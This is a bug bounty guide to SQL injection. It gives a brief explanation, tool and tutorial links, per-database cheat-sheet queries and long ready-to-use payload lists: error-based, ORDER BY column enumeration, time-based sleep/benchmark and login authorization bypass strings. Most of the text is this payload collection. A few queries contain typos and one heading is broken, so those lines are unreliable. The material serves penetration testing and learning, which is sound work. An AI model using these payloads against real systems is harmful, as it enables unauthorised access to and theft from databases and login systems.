# SQL Injection

As a bug bounty hunter, SQL injection vulnerabilities are a high-priority target because they can allow attackers to gain unauthorized access to sensitive information or even take control of a website or application.

SQL injection occurs when an attacker is able to inject malicious SQL code into a vulnerable web application, which is then executed by the database. This can happen when an application does not properly sanitize user input, allowing an attacker to insert their own SQL statements.

## To find SQL injection vulnerabilities, a bug bounty hunter can use a variety of methods, including:

Manual testing: By using tools like Burp Suite or OWASP ZAP, a tester can manually inject SQL code into web forms and other input fields to see if the application is vulnerable. This method is time-consuming and requires a high degree of technical knowledge.

Automated testing: There are many automated vulnerability scanners that can detect SQL injection vulnerabilities, such as SQLMap or Netsparker. These tools can scan an entire application and report any vulnerabilities they find, which can save time for the tester.

Fuzzing: Fuzzing involves generating large amounts of random or semi-random input to see how the application responds. By fuzzing an application's input fields, a tester can sometimes trigger unexpected behavior that reveals a SQL injection vulnerability.

Once a SQL injection vulnerability has been identified, a bug bounty hunter can typically exploit it to gain unauthorized access to the application or database. This might involve using SQL commands to extract data, modify data, or even execute code on the server.

It's important to note that SQL injection vulnerabilities can be prevented by properly sanitizing user input and using prepared statements with parameterized queries. However, many applications still contain these vulnerabilities, which is why they are a popular target for bug bounty hunters.

## Tools to help find SQL Injection Vulnerabilities
* [sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL Injection and Database takeover tool
* [NoSQLMap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web app exploit tool
* [SQLiScanner](https://github.com/0xbug/SQLiScanner) - This is an automatic SQL Injection with sqlmap api
* [sqli-hunter](https://github.com/zt2/sqli-hunter) - It is a simple HTTP/HTTPS proxy server that helps in finding SQL Injections
* [waybacksqlscanner](https://github.com/ghostlulzhacks/waybackSqliScanner) - This gathers urls from the wayback machine then tests for sql injection using the GET parameter
* [burp-to-sqlmap](https://github.com/Miladkhoshdel/burp-to-sqlmap) - This performs SQLInjection test on Burp Suite Bulk Requests using SQLMap
* [andor](https://github.com/sadicann/andor) - Blind SQL Injection tool written in Golang
* [nosqli](https://github.com/Charlie-belmer/nosqli) - NoSql Injection Command Line Tool that finds websites using MongoDB

## Good Tutorials for SQL Injection
* [What is SQL Injection? Tutorial and Examples](https://portswigger.net/web-security/sql-injection) - A tutorial from PortSwigger
* [SQL Injection Tutorial: Learn with Example](https://www.guru99.com/learn-sql-injection-with-practical-example.html) - A pretty good overview of SQL Injection by Guru99
* [SQL Injection - W3 Schools](https://www.w3schools.com/sql/sql_injection.asp) - An overview of SQL Injection by W3Schools
* [SQL Injection Tutorial](https://hackertarget.com/sql-injection/) - A tutorial that is pretty good by Hacker Target


## SQL Injection Cheat Sheet

Below is a pretty good cheat sheet on SQL Injection. It is organized mostly by the manufactuer but some of the code examples can be used universally. Once you understand the principles of SQL Injection this will make a lot more sense.

### String concatenation

String concatention is the process of putting two strings together

**Oracle**
```
'bond' || 'james bond'
```
**Microsoft**
```
'bond' + 'james bond'
```
**PostgreSQL**
```
'bond' || 'james bond'
```
**MySQL**
```
CONCAT('bond', 'james bond')
```

### Substring

**Oracle**
```
SUBSTR('james bond', 3, 2)
```
**Microsoft**
```
SUBSTRING('james bond', 3, 2)
```

**PostgresSQL**
```
SUBSTRING('james bond', 3, 2)
```

**MySQL**
```
SUBSTRING ('james bond', 3, 2)
```

### Comments

You can use comments to truncate or end a query

**Oracle**
```
--comment
```

**Microsoft**
```
--comment
/* comment */
```

**PostgreSQL**
```
--comment
/* comment */
```
**MySQL**
```
#comment
-- comment {This has a space after the double dash}
/* comment */

```

### Conditional Errors

Testing for a single boolean condition can trigger a database error and that can reveal quite a bit about the database and its contents

**Oracle**
```
SELECT CASE WHEN (CONDITON-YOU-ARE-TESTING) THEN TO_CHAR (1/0) ELSE NULL END from dual
```
**Microsoft**
```
SELECT CASE WHEN (CONDITON-YOU-ARE-TESTING) THEN 1/0 ELSE NULL END
```
**ProgreSQL**
```
1 = (SELECT CASE WHEN(CONDITON-YOU-ARE-TESTING) THEN 1/(SELECT 0) ELSE NULL END)
```
**MySQL**
```
SELECT IF(CONDITON-YOU-ARE-TESTING, (SELECT table_name FROM information_scheme.tables,'a'))
```

### Database Version

Determing the type and version of a database is crucial to finding out if it may be vulnerable to SQL Injection

**Oracle**
```
SELECT banner FROM v$version
SELECT version FROM v$instance
```

**Microsoft**
```
SELECT @@version
```

**PostgreSQL**
```
SELECT version()
```
**MySQL**
```
SELECT @@version
```
## Database Contents

Revealing the table contents can be a big win when performing a penetration test

**Oracle**
```
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'INSERT TABLE NAME'
```

**Microsoft**
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'INSERT TABLE NAME'
```
**PostgreSQL**
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema_columns WHERE table_name = 'INSERT TABLE NAME'
```

**MySQL**
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'INSERT TABLE NAME'
```

### Time Delays

A time delay may cause a SQL database to become vulnerable or allow other attack vectors
The follow shows how to create a delay of 15 seconds, you can of course do it for however long or short you want

**Oracle**
```
dbms_pipe.recieve_message(('error'), 15)
```
**Microsoft**
```
WAITFOR DELAY '0:0:15'
```

**PostgreSQL**
```
SELECT pq_sleep(15)
```
**MySQL**
```
SELECT SLEEP(15)
```


### SQL Payloads

**Numeric**
```
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
```
**Error Based**
```
OR 1=0
OR x=x
OR x=y
OR 1=1#
OR 1=0#
OR x=x#
OR x=y#
OR 1=1-- 
OR 1=0-- 
OR x=x-- 
OR x=y-- 
OR 3409=3409 AND ('pytW' LIKE 'pytW
OR 3409=3409 AND ('pytW' LIKE 'pytY
HAVING 1=1
HAVING 1=0
HAVING 1=1#
HAVING 1=0#
HAVING 1=1-- 
HAVING 1=0-- 
AND 1=1
AND 1=0
AND 1=1-- 
AND 1=0-- 
AND 1=1#
AND 1=0#
AND 1=1 AND '%'='
AND 1=0 AND '%'='
AND 1083=1083 AND (1427=1427
AND 7506=9091 AND (5913=5913
AND 1083=1083 AND ('1427=1427
AND 7506=9091 AND ('5913=5913
AND 7300=7300 AND 'pKlZ'='pKlZ
AND 7300=7300 AND 'pKlZ'='pKlY
AND 7300=7300 AND ('pKlZ'='pKlZ
AND 7300=7300 AND ('pKlZ'='pKlY
AS INJECTX WHERE 1=1 AND 1=1
AS INJECTX WHERE 1=1 AND 1=0
AS INJECTX WHERE 1=1 AND 1=1#
AS INJECTX WHERE 1=1 AND 1=0#
AS INJECTX WHERE 1=1 AND 1=1--
AS INJECTX WHERE 1=1 AND 1=0--
WHERE 1=1 AND 1=1
WHERE 1=1 AND 1=0
WHERE 1=1 AND 1=1#
WHERE 1=1 AND 1=0#
WHERE 1=1 AND 1=1--
WHERE 1=1 AND 1=0-
```
**Generic Order By Payloads**R 1=1

```
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 ORDER BY 11-- 
 ORDER BY 12-- 
 ORDER BY 13-- 
 ORDER BY 14-- 
 ORDER BY 15-- 
 ORDER BY 16-- 
 ORDER BY 17-- 
 ORDER BY 18-- 
 ORDER BY 19-- 
 ORDER BY 20-- 
 ORDER BY 21-- 
 ORDER BY 22-- 
 ORDER BY 23-- 
 ORDER BY 24-- 
 ORDER BY 25-- 
 ORDER BY 26-- 
 ORDER BY 27-- 
 ORDER BY 28-- 
 ORDER BY 29-- 
 ORDER BY 30-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 
 ORDER BY 11# 
 ORDER BY 12# 
 ORDER BY 13# 
 ORDER BY 14# 
 ORDER BY 15# 
 ORDER BY 16# 
 ORDER BY 17# 
 ORDER BY 18# 
 ORDER BY 19# 
 ORDER BY 20# 
 ORDER BY 21# 
 ORDER BY 22# 
 ORDER BY 23# 
 ORDER BY 24# 
 ORDER BY 25# 
 ORDER BY 26# 
 ORDER BY 27# 
 ORDER BY 28# 
 ORDER BY 29# 
 ORDER BY 30#
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 8 
 ORDER BY 9 
 ORDER BY 10 
 ORDER BY 11 
 ORDER BY 12 
 ORDER BY 13 
 ORDER BY 14 
 ORDER BY 15 
 ORDER BY 16 
 ORDER BY 17 
 ORDER BY 18 
 ORDER BY 19 
 ORDER BY 20 
 ORDER BY 21 
 ORDER BY 22 
 ORDER BY 23 
 ORDER BY 24 
 ORDER BY 25 
 ORDER BY 26 
 ORDER BY 27 
 ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 
```
**Time based payloads**
```
# from wapiti
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
```

**Authorization Bypass Payloads**
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
```